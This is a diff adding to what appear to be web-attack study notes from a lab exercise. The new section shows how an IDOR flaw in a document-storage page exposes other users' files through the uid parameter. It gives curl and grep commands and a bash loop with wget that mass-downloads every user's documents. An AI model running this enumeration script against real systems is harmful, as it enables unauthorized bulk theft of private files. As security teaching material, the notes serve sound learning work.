@@ -138,8 +138,52 @@ The above function may never be called as a non-admin user, but if we find it in
 ![idor documents](images/web_attacks_idor_documents.jpg)
 *Example IDOR vulneerable website*
 
+- Analyzing the page, we see several documents belonging to the user
+```html
+/documents/Invoice_1_09_2021.pdf
+/documents/Report_1_10_2021.pdf
+```
+- It looks like the app is using the `uid` parameter as part of the file name.
+- Changing the `uid` parameter to '2', we see we have new file names:
+```html
+/documents/Invoice_2_08_2020.pdf
+/documents/Report_2_12_2020.pdf
+```
+- Enumerating these manually will take forever, we need to automate
+### Mass Enumeration
+- Inspecting the code in firefox, we see the following html for the links:
+```htmml
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+- We could grep for the links, using curl
+```bash
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
 
-Give the above IDOR vulnerable file storage service.
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+- A better plan might be to use a regex to isolate the actual url:
+```bash
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+
+/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
+```
+- Now we can use a bash `for` loop and wget to create a script to download all the files for all of the users
+```bash
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+*This script only works on employees 1-10. We'll need to adjust it for further use*
+
 ## Bypassing Encoded References
 ## IDOR in Insecure APIs
 ## Chaining IDOR Vulnerabilities
